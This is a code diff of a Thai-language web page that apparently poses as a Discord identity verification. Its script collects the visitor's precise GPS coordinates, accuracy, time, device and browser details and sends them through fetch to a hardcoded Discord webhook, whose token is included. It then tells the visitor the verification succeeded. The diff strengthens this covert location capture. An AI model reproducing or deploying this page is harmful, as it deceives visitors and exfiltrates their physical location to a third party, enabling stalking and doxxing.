@@ -1,11 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Skidibi To Welcome</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 2rem;
+      background: #f0f0f0;
+      color: #222;
+      text-align: center;
+    }
+    button {
+      font-size: 1.2rem;
+      padding: 0.7rem 1.5rem;
+      background-color: #5865F2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #4752c4;
+    }
+    #status {
+      margin-top: 1rem;
+      font-weight: bold;
+      min-height: 1.5rem;
+    }
+  </style>
 </head>
 <body>
-  <h2>📍 ยืนยันตัวตน discord</h2>
+  <h2>📍 ยืนยันตัวตน Discord</h2>
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
   <p id="status">ยังไม่มีการส่งข้อมูล</p>
 
@@ -13,45 +40,86 @@
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
 
     function getLocation() {
-      document.getElementById("status").innerText = "⏳ กําลังไป..";
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
-      } else {
-        document.getElementById("status").innerText = "❌ เบราว์เซอร์ไม่รองรับ";
+      const statusEl = document.getElementById("status");
+      statusEl.innerText = "⏳ กําลังขออนุญาตตำแหน่ง...";
+      
+      if (!navigator.geolocation) {
+        statusEl.innerText = "❌ เบราว์เซอร์ของคุณไม่รองรับ Geolocation";
+        return;
       }
+
+      // ขอพิกัดแบบแม่นยำสูงสุด (enableHighAccuracy: true)
+      navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
     }
 
     function sendToDiscord(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+      const statusEl = document.getElementById("status");
+
+      // ข้อมูลตำแหน่ง
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
+      const accuracy = position.coords.accuracy.toFixed(1); // ความแม่นยำ (เมตร)
+      const timestamp = new Date(position.timestamp).toLocaleString('th-TH', {
+        year: 'numeric', month: '2-digit', day: '2-digit',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+      });
       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      // ข้อมูลอุปกรณ์
       const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
 
       const data = {
-        content: `📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n💻 อุปกรณ์: ${userAgent}`
+        content: `📍 มีผู้ใช้ยืนยันตัวตน Discord\n\n` +
+                 `🕒 เวลาระบุ: ${timestamp}\n` +
+                 `🌐 [ดูตำแหน่งบนแผนที่](${mapUrl})\n` +
+                 `📌 พิกัด: ${lat}, ${lon}\n` +
+                 `📏 ความแม่นยำ: ±${accuracy} เมตร\n` +
+                 `💻 อุปกรณ์: ${userAgent}\n` +
+                 `🖥️ แพลตฟอร์ม: ${platform}\n` +
+                 `🌏 ภาษาเบราว์เซอร์: ${language}`
       };
+
+      statusEl.innerText = "⏳ กําลังส่งข้อมูลไปยัง Discord...";
 
       fetch(webhookUrl, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       })
       .then(response => {
         if (response.ok) {
-          document.getElementById("status").innerText = "✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!";
+          statusEl.innerText = "✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!";
         } else {
-          document.getElementById("status").innerText = "❌ ส่งข้อมูลไม่สำเร็จ";
+          statusEl.innerText = `❌ ส่งข้อมูลไม่สำเร็จ (รหัส: ${response.status})`;
         }
       })
-      .catch(error => {
-        document.getElementById("status").innerText = "❌ เกิดข้อผิดพลาด: " + error;
+      .catch(err => {
+        statusEl.innerText = "❌ เกิดข้อผิดพลาด: " + err.message;
       });
     }
 
     function showError(error) {
-      document.getElementById("status").innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (" + error.message + ")";
+      const statusEl = document.getElementById("status");
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          statusEl.innerText = "❌ ผู้ใช้ปฏิเสธการขออนุญาตตำแหน่ง";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          statusEl.innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (ข้อมูลตำแหน่งไม่พร้อม)";
+          break;
+        case error.TIMEOUT:
+          statusEl.innerText = "❌ หมดเวลาการรอการระบุตำแหน่ง";
+          break;
+        default:
+          statusEl.innerText = "❌ เกิดข้อผิดพลาดในการระบุตำแหน่ง: " + error.message;
+          break;
+      }
     }
   </script>
 </body>
